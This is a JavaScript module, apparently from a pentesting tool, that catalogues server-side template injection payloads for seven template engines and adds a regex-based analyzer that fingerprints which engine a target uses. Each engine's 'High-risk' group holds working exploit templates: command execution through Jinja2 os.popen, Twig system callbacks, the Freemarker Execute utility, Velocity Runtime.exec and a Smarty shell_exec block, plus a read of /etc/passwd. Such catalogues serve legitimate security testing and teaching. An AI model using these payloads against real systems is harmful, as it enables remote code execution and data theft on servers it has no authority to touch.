const PLACEHOLDER_MAP = {
  VARIABLE: 'name',
  VALUE: 'R0uty',
  EXPRESSION: '7*7',
  COMMAND: 'id'
}

export const sstiEngines = {
  jinja2: {
    name: 'Jinja2 / Flask',
    family: 'Python',
    syntax: '{{ expression }} / {% block %}',
    description: 'Common in Flask and other Python applications. Often exposes config, request, and Python object traversal paths.',
    nextProbes: ['{{7*7}}', '{{ config.items() }}', '{{ request.path }}'],
    sample: {
      template: '{{7*7}} :: {{ config.items() }}',
      observed: '49 :: dict_items([(SECRET_KEY, redacted)])\njinja2.exceptions.UndefinedError: \'request\' is undefined'
    },
    analyzer: {
      templatePatterns: [/\{%\s*(for|if|set|block|extends|include)/i, /\bconfig\b/i, /\bcycler\b/i, /_TemplateReference__context/i, /__class__/i],
      observedPatterns: [/jinja2/i, /templatesyntaxerror/i, /undefinederror/i, /dict_items/i, /werkzeug/i]
    },
    payloadGroups: [
      {
        key: 'detection',
        name: 'Detection & arithmetic probes',
        payloads: [
          { name: 'Arithmetic probe', template: '{{ {EXPRESSION} }}', note: 'If evaluated, arithmetic should be rendered instead of echoed literally.' },
          { name: 'Variable lookup', template: '{{ {VARIABLE} }}', note: 'Useful for checking whether user-controlled names are resolved in template context.' },
          { name: 'Filter probe', template: '{{ "{VALUE}"|upper }}', note: 'Confirms filter execution and output transformation.' }
        ]
      },
      {
        key: 'context',
        name: 'Context discovery',
        payloads: [
          { name: 'Configuration dump', template: '{{ config.items() }}', note: 'Tests whether application configuration is reachable.' },
          { name: 'Request path', template: '{{ request.path }}', note: 'Useful when Flask request helpers are in scope.' },
          { name: 'Internal template context', template: '{{ self._TemplateReference__context }}', note: 'Probes for internal context references used in exploitation chains.' }
        ]
      },
      {
        key: 'risky',
        name: 'High-risk object access',
        payloads: [
          { name: 'Globals traversal', template: '{{ cycler.__init__.__globals__ }}', note: 'Checks whether Python globals are reachable from safe-looking helpers.' },
          { name: 'OS command chain', template: '{{ cycler.__init__.__globals__.os.popen("{COMMAND}").read() }}', note: 'Illustrates a high-impact command execution path in vulnerable Jinja contexts.' },
          { name: 'Class hierarchy walk', template: "{{ ''.__class__.__mro__[1].__subclasses__() }}", note: 'Classic Python object traversal probe for gadget discovery.' }
        ]
      }
    ]
  },
  twig: {
    name: 'Twig',
    family: 'PHP',
    syntax: '{{ expression }} / {% block %}',
    description: 'Common in Symfony and PHP applications. Twig shares delimiter syntax with Jinja, but exposes PHP-oriented helpers and errors.',
    nextProbes: ['{{7*7}}', '{{ dump(app) }}', '{{ constant("PHP_VERSION") }}'],
    sample: {
      template: '{{7*7}} {{ dump(app) }}',
      observed: '49\nTwig\\Error\\RuntimeError: Variable "app" does not exist.'
    },
    analyzer: {
      templatePatterns: [/\bdump\(/i, /\bconstant\(/i, /\b_self\b/i, /\bapp\./i],
      observedPatterns: [/twig\\error/i, /\btwig\b/i, /runtimeerror/i, /variable ".*" does not exist/i]
    },
    payloadGroups: [
      {
        key: 'detection',
        name: 'Detection & arithmetic probes',
        payloads: [
          { name: 'Arithmetic probe', template: '{{ {EXPRESSION} }}', note: 'Confirms that Twig expressions are evaluated server-side.' },
          { name: 'Self reference', template: '{{ _self }}', note: 'A simple Twig-specific object reference.' },
          { name: 'String join probe', template: '{{ ["{VALUE}","lab"]|join("-") }}', note: 'Exercises common filter execution paths.' }
        ]
      },
      {
        key: 'context',
        name: 'Context discovery',
        payloads: [
          { name: 'Dump app object', template: '{{ dump(app) }}', note: 'Useful when Symfony debug helpers are enabled.' },
          { name: 'PHP constant read', template: '{{ constant("PHP_VERSION") }}', note: 'Checks for access to PHP constants.' },
          { name: 'Request server bag', template: '{{ app.request.server.all|json_encode }}', note: 'Attempts to dump server values from Symfony request context.' }
        ]
      },
      {
        key: 'risky',
        name: 'High-risk helper abuse',
        payloads: [
          { name: 'Map to system', template: '{{ ["{COMMAND}"]|map("system")|join }}', note: 'Demonstrates dangerous callback/filter abuse when sandboxing is weak.' },
          { name: 'Register undefined callback', template: '{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("{COMMAND}") }}', note: 'Classic Twig exploitation chain in misconfigured environments.' },
          { name: 'Template environment', template: '{{ dump(_self.env) }}', note: 'Inspects available environment helpers and extensions.' }
        ]
      }
    ]
  },
  freemarker: {
    name: 'Freemarker',
    family: 'Java',
    syntax: '${expression} / <#directive>',
    description: 'Widely used in Java applications. Freemarker often exposes rich object models and Java utility classes.',
    nextProbes: ['${7*7}', '${.version}', '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }'],
    sample: {
      template: '${7*7} ${.version}',
      observed: '49 2.3.32\nfreemarker.core.InvalidReferenceException: The following has evaluated to null or missing'
    },
    analyzer: {
      templatePatterns: [/<#assign\b/i, /<#[a-z]+/i, /\$\{[^}]+\}/i, /\.version/i, /\?new\(\)/i],
      observedPatterns: [/freemarker/i, /invalidreferenceexception/i, /templateexception/i, /nonnumericalexception/i]
    },
    payloadGroups: [
      {
        key: 'detection',
        name: 'Detection & arithmetic probes',
        payloads: [
          { name: 'Arithmetic probe', template: '${{EXPRESSION}}', note: 'Freemarker often cleanly evaluates numeric expressions.' },
          { name: 'Version disclosure', template: '${.version}', note: 'Good first probe for Freemarker identification.' },
          { name: 'Variable lookup', template: '${{VARIABLE}}', note: 'Checks whether user-controlled names resolve in the data model.' }
        ]
      },
      {
        key: 'context',
        name: 'Context discovery',
        payloads: [
          { name: 'Data model keys', template: '${.data_model?keys}', note: 'Enumerates top-level keys exposed to the template.' },
          { name: 'Main namespace', template: '${.main?keys}', note: 'Looks for macros and namespace entries.' },
          { name: 'Locale and time zone', template: '${.locale} / ${.time_zone}', note: 'Low-risk environment disclosure probe.' }
        ]
      },
      {
        key: 'risky',
        name: 'High-risk utility access',
        payloads: [
          { name: 'Execute utility', template: '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("{COMMAND}") }', note: 'Classic Java-side command execution primitive when dangerous built-ins are exposed.' },
          { name: 'Object constructor probe', template: '${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.String","{VALUE}")}', note: 'Checks if the object constructor helper is accessible.' },
          { name: 'Runtime class access', template: '${"java.lang.Runtime"?new()}', note: 'Useful for spotting hardened vs weak class exposure settings.' }
        ]
      }
    ]
  },
  velocity: {
    name: 'Apache Velocity',
    family: 'Java',
    syntax: '$var / #directive',
    description: 'Seen in legacy Java applications. Velocity frequently exposes a broad context object and Java reflection helpers.',
    nextProbes: ['#set($x=7*7)$x', '#foreach($k in $context.keySet())$k#end', '$class.inspect("java.lang.Runtime").type'],
    sample: {
      template: '#set($x=7*7)$x',
      observed: '49\norg.apache.velocity.exception.ParseErrorException'
    },
    analyzer: {
      templatePatterns: [/#set\(/i, /#foreach\(/i, /#if\(/i, /\$class\.inspect/i, /\$context\b/i],
      observedPatterns: [/velocity/i, /parseerrorexception/i, /methodinvocationexception/i, /lexical error/i]
    },
    payloadGroups: [
      {
        key: 'detection',
        name: 'Detection & arithmetic probes',
        payloads: [
          { name: 'Arithmetic probe', template: '#set($x={EXPRESSION})$x', note: 'Fast confirmation that Velocity expressions are being evaluated.' },
          { name: 'Variable echo', template: '${{VARIABLE}}', note: 'Checks whether context variables resolve directly.' },
          { name: 'Quiet reference', template: '$!{{VARIABLE}}', note: 'Avoids noisy errors when probing undefined values.' }
        ]
      },
      {
        key: 'context',
        name: 'Context discovery',
        payloads: [
          { name: 'Context keys', template: '#foreach($k in $context.keySet())$k #end', note: 'Lists visible keys in the Velocity context.' },
          { name: 'Request object', template: '$request', note: 'Quick probe for exposed servlet request objects.' },
          { name: 'Inspect String class', template: '$class.inspect("java.lang.String").type', note: 'Identifies whether reflection helpers are present.' }
        ]
      },
      {
        key: 'risky',
        name: 'High-risk reflection paths',
        payloads: [
          { name: 'Runtime access', template: '$class.inspect("java.lang.Runtime").type.getRuntime().exec("{COMMAND}")', note: 'Tests whether dangerous Java reflection helpers are exposed.' },
          { name: 'ProcessBuilder probe', template: '$class.inspect("java.lang.ProcessBuilder").type', note: 'Useful for assessing exploit depth in Java contexts.' },
          { name: 'Classloader access', template: '$class.inspect("java.lang.Thread").type.currentThread().getContextClassLoader()', note: 'Enumerates deeper Java internals when available.' }
        ]
      }
    ]
  },
  smarty: {
    name: 'Smarty',
    family: 'PHP',
    syntax: '{$var} / {if ...}',
    description: 'Older PHP stacks and CMS platforms often use Smarty. It has distinctive variable wrappers and historical PHP execution features.',
    nextProbes: ['{$smarty.version}', '{$smarty.server.SERVER_NAME}', '{php}echo shell_exec("id");{/php}'],
    sample: {
      template: '{$smarty.version}',
      observed: 'Smarty version 4.3.1\nSmarty Compiler: Syntax error in template'
    },
    analyzer: {
      templatePatterns: [/\{\$smarty\./i, /\{if\s+/i, /\{assign\b/i, /\{php\}/i],
      observedPatterns: [/\bsmarty\b/i, /syntax error in template/i, /unable to load template/i]
    },
    payloadGroups: [
      {
        key: 'detection',
        name: 'Detection & variable probes',
        payloads: [
          { name: 'Version disclosure', template: '{$smarty.version}', note: 'A very strong Smarty fingerprint.' },
          { name: 'Timestamp probe', template: '{$smarty.now}', note: 'Confirms access to built-in Smarty objects.' },
          { name: 'Variable lookup', template: '{$' + '{VARIABLE}' + '}', note: 'Checks whether the chosen variable is available in context.' }
        ]
      },
      {
        key: 'context',
        name: 'Context discovery',
        payloads: [
          { name: 'Server values', template: '{$smarty.server.SERVER_NAME}', note: 'Reads common server metadata if exposed.' },
          { name: 'Request parameters', template: '{$smarty.get}', note: 'Shows whether request data is injected into the template.' },
          { name: 'Cookies object', template: '{$smarty.cookies}', note: 'Checks exposure of cookie data within the template.' }
        ]
      },
      {
        key: 'risky',
        name: 'High-risk legacy features',
        payloads: [
          { name: 'Legacy php block', template: '{php}echo shell_exec("{COMMAND}");{/php}', note: 'Illustrates an extremely dangerous legacy Smarty feature in older configurations.' },
          { name: 'Fetch plugin probe', template: '{fetch file="file:///etc/passwd"}', note: 'Tests local file reads where fetch plugins are enabled.' },
          { name: 'Debug console', template: '{debug}', note: 'Can reveal assigned variables and execution context.' }
        ]
      }
    ]
  },
  handlebars: {
    name: 'Handlebars',
    family: 'JavaScript',
    syntax: '{{value}} / {{#block}}',
    description: 'Popular in Node.js and front-end stacks. Handlebars is more constrained, but helpers and constructor access still matter.',
    nextProbes: ['{{this}}', '{{lookup this "constructor"}}', '{{#with this as |ctx|}}{{ctx}}{{/with}}'],
    sample: {
      template: '{{lookup this "constructor"}}',
      observed: 'function Object() { [native code] }\nHandlebars: Parse error on line 1'
    },
    analyzer: {
      templatePatterns: [/\{\{#with/i, /\{\{#each/i, /\{\{lookup\b/i, /\bconstructor\b/i, /\{\{\{.*\}\}\}/i],
      observedPatterns: [/handlebars/i, /missing helper/i, /parse error on line/i]
    },
    payloadGroups: [
      {
        key: 'detection',
        name: 'Detection & helper probes',
        payloads: [
          { name: 'Current context', template: '{{this}}', note: 'The simplest Handlebars probe for context rendering.' },
          { name: 'Variable lookup', template: '{{lookup this "{VARIABLE}"}}', note: 'Checks if a chosen property exists in the current context.' },
          { name: 'Triple braces output', template: '{{{' + '{VARIABLE}' + '}}}', note: 'Looks for raw output behavior with unescaped rendering.' }
        ]
      },
      {
        key: 'context',
        name: 'Context discovery',
        payloads: [
          { name: 'With alias', template: '{{#with this as |ctx|}}{{ctx}}{{/with}}', note: 'Confirms block helpers and current object access.' },
          { name: 'Constructor probe', template: '{{lookup this "constructor"}}', note: 'Useful for spotting unsafe prototype exposure.' },
          { name: 'Property iteration', template: '{{#each this}}{{@key}}={{this}} {{/each}}', note: 'Enumerates top-level keys in the current context.' }
        ]
      },
      {
        key: 'risky',
        name: 'High-risk prototype access',
        payloads: [
          { name: 'Constructor name', template: '{{lookup (lookup this "constructor") "name"}}', note: 'Tests chained prototype/property access.' },
          { name: 'Prototype alias', template: '{{#with (lookup this "constructor") as |ctor|}}{{ctor}}{{/with}}', note: 'Assesses helper behavior around native constructors.' },
          { name: 'Nested lookup chain', template: '{{lookup (lookup (lookup this "constructor") "prototype") "{VARIABLE}"}}', note: 'Useful when exploring unexpected object exposure.' }
        ]
      }
    ]
  },
  liquid: {
    name: 'Liquid',
    family: 'Ruby / Shopify',
    syntax: '{{ value }} / {% tag %}',
    description: 'Common in Shopify and Ruby ecosystems. Liquid is usually sandboxed, so the best value is strong fingerprinting and context discovery.',
    nextProbes: ['{{ 7 | plus: 7 }}', '{{ ' + 'name' + ' }}', '{% assign probe = "lab" %}{{ probe }}'],
    sample: {
      template: '{{ 7 | plus: 7 }}',
      observed: '14\nLiquid error: undefined variable'
    },
    analyzer: {
      templatePatterns: [/\|\s*plus:/i, /\{%\s*assign/i, /\{%\s*for/i, /\{%\s*if/i],
      observedPatterns: [/\bliquid\b/i, /unknown tag/i, /variable .* was not properly terminated/i, /liquid error/i]
    },
    payloadGroups: [
      {
        key: 'detection',
        name: 'Detection & filter probes',
        payloads: [
          { name: 'Numeric filter probe', template: '{{ 7 | plus: 7 }}', note: 'A clean Liquid-specific arithmetic-style probe.' },
          { name: 'Variable lookup', template: '{{ {VARIABLE} }}', note: 'Checks whether a named variable is present in scope.' },
          { name: 'Upper filter', template: '{{ "{VALUE}" | upcase }}', note: 'Validates filter execution and string transformation.' }
        ]
      },
      {
        key: 'context',
        name: 'Context discovery',
        payloads: [
          { name: 'Assign and render', template: '{% assign probe = "{VALUE}" %}{{ probe }}', note: 'Confirms tag execution and local variable assignment.' },
          { name: 'Current page object', template: '{{ page | json }}', note: 'Useful in environments that expose page objects.' },
          { name: 'Settings object', template: '{{ settings | json }}', note: 'Common in theme-style Liquid contexts.' }
        ]
      },
      {
        key: 'risky',
        name: 'Sandbox boundary checks',
        payloads: [
          { name: 'Render tag probe', template: '{% render "{VALUE}" %}', note: 'Tests whether render/include style tags are available.' },
          { name: 'Capture block', template: '{% capture probe %}{{ {VARIABLE} }}{% endcapture %}{{ probe }}', note: 'Checks for nested tag and variable behavior.' },
          { name: 'For-loop object walk', template: '{% for item in collections %}{{ item.title }} {% endfor %}', note: 'Useful for gauging what high-level objects are exposed.' }
        ]
      }
    ]
  }
}

export const getAllSstiEngines = () => Object.entries(sstiEngines).map(([id, engine]) => ({
  id,
  ...engine
}))

export const getPayloadGroupsForEngine = (engineId) => sstiEngines[engineId]?.payloadGroups ?? []

export const getSampleForEngine = (engineId) => sstiEngines[engineId]?.sample ?? { template: '', observed: '' }

export const fillPayloadTemplate = (template, replacements = {}) => {
  const values = {
    ...PLACEHOLDER_MAP,
    ...replacements
  }

  return template.replace(/\{(VARIABLE|VALUE|EXPRESSION|COMMAND)\}/g, (_, key) => values[key])
}

const GENERIC_TEMPLATE_MARKERS = [
  { regex: /\{\{[\s\S]*\}\}/, message: 'Detected double-curly template expressions in the probe or response.', severity: 'medium' },
  { regex: /\{%[\s\S]*%\}/, message: 'Detected block-style template tags.', severity: 'medium' },
  { regex: /\$\{[\s\S]*\}/, message: 'Detected ${...} expression syntax commonly seen in Java template engines.', severity: 'medium' },
  { regex: /<#[a-z]+/i, message: 'Detected Freemarker directive syntax (<#...>).', severity: 'high' },
  { regex: /#set\(|#foreach\(|#if\(/i, message: 'Detected Apache Velocity directive syntax.', severity: 'high' },
  { regex: /\{\$[^}]+\}/, message: 'Detected Smarty variable syntax.', severity: 'high' }
]

const GENERIC_RISK_SIGNALS = [
  { regex: /__globals__|__class__|_TemplateReference__context/i, message: 'Python object traversal indicators were found.', severity: 'high' },
  { regex: /system\(|shell_exec|popen\(|Runtime|ProcessBuilder|getRuntime\(\)|exec\(/i, message: 'Command-execution-oriented primitives were found.', severity: 'high' },
  { regex: /\bconfig\b|\brequest\b|\bapp\b|data_model|context\.keySet|smarty\.server|settings\s*\|/i, message: 'Context-discovery patterns were found.', severity: 'medium' }
]

const ARITHMETIC_PROBES = [
  { probe: /7\s*\*\s*7/, result: /\b49\b/, message: 'Arithmetic probe appears to have evaluated (7*7 -> 49).', severity: 'high' },
  { probe: /8\s*\*\s*8/, result: /\b64\b/, message: 'Arithmetic probe appears to have evaluated (8*8 -> 64).', severity: 'high' },
  { probe: /1337\s*-\s*1/, result: /\b1336\b/, message: 'Arithmetic probe appears to have evaluated (1337-1 -> 1336).', severity: 'high' }
]

const getConfidenceLabel = (score) => {
  if (score >= 9) return 'high'
  if (score >= 5) return 'medium'
  return 'low'
}

const pushUniqueFinding = (findings, finding) => {
  if (!findings.some((entry) => entry.message === finding.message)) {
    findings.push(finding)
  }
}

export const analyzeSstiProbe = ({ templateInput = '', observedInput = '' }) => {
  const template = templateInput.trim()
  const observed = observedInput.trim()
  const combined = `${template}\n${observed}`
  const findings = []

  GENERIC_TEMPLATE_MARKERS.forEach((marker) => {
    if (marker.regex.test(combined)) {
      pushUniqueFinding(findings, marker)
    }
  })

  GENERIC_RISK_SIGNALS.forEach((signal) => {
    if (signal.regex.test(combined)) {
      pushUniqueFinding(findings, signal)
    }
  })

  ARITHMETIC_PROBES.forEach((probe) => {
    if (probe.probe.test(template) && probe.result.test(observed)) {
      pushUniqueFinding(findings, probe)
    }
  })

  const engineMatches = getAllSstiEngines()
    .map((engine) => {
      let score = 0
      const reasons = []

      engine.analyzer.templatePatterns.forEach((pattern) => {
        if (pattern.test(template)) {
          score += 3
          reasons.push('Matched engine-specific template syntax')
        }
      })

      engine.analyzer.observedPatterns.forEach((pattern) => {
        if (pattern.test(observed)) {
          score += 5
          reasons.push('Matched engine-specific output or error signature')
        }
      })

      if (ARITHMETIC_PROBES.some((probe) => probe.probe.test(template) && probe.result.test(observed))) {
        score += 1
        reasons.push('Observed arithmetic evaluation')
      }

      return {
        id: engine.id,
        name: engine.name,
        family: engine.family,
        confidence: getConfidenceLabel(score),
        score,
        reasons: [...new Set(reasons)],
        nextProbes: engine.nextProbes
      }
    })
    .filter((engine) => engine.score > 0)
    .sort((a, b) => b.score - a.score)

  const topMatch = engineMatches[0] ?? null
  const genericNextSteps = ['Try a simple arithmetic probe', 'Check whether context objects are exposed', 'Look for engine-specific errors or stack traces']

  return {
    engineMatches,
    findings,
    summary: topMatch
      ? `${topMatch.name} is the strongest match based on the pasted syntax and output clues.`
      : 'The pasted content shows generic template behavior, but there is not enough engine-specific evidence yet.',
    nextSteps: topMatch?.nextProbes ?? genericNextSteps
  }
}
